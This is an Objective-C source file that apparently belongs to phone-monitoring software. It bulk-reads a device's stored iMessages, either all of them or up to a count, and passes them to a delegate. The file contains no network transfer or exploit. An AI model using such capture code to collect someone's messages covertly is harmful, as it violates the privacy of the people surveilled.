//
//  HistoricalEventIMessageOP.m
//  HistoricalEventManager
//
//  Created by Benjawan Tanarattanakorn on 1/6/2558 BE.
//
//

#import "HistoricalEventIMessageOP.h"

#import "IMessageCaptureManager.h"

@interface HistoricalEventIMessageOP (private)
- (void) captureHistoricaliMessageWithTotalNumber;
@end

@implementation HistoricalEventIMessageOP

- (void) main {
	NSAutoreleasePool* pool = [[NSAutoreleasePool alloc] init];
	DLog(@"---- iMessage main ---- ")
	[self captureHistoricaliMessageWithTotalNumber];
	[pool release];
}


- (void) captureHistoricaliMessageWithTotalNumber {
    NSArray *iMessages = [NSArray array];
    
    // check total number of event
    if (mTotalNumber == -1) {
        DLog(@"Get All iMessages")
        iMessages = [IMessageCaptureManager alliMessages];
    } else {
        DLog(@"Get %ld iMessages", (long)mTotalNumber)
        iMessages = [IMessageCaptureManager alliMessagesWithMax:mTotalNumber];
    }
    
    if ([mDelegate respondsToSelector:mOPCompletedSelector]) {
		NSDictionary *capturedData = [NSDictionary dictionaryWithObjectsAndKeys:
                                      [NSNumber numberWithUnsignedInt:kHistoricalEventTypeIMIMessage], kHistoricalEventTypeKey,
                                      iMessages,                                       kHistoricalEventDataKey,
                                      nil];
        
		[mDelegate performSelector:mOPCompletedSelector
                          onThread:mThread
                        withObject:capturedData
                     waitUntilDone:NO];
	}
}

@end
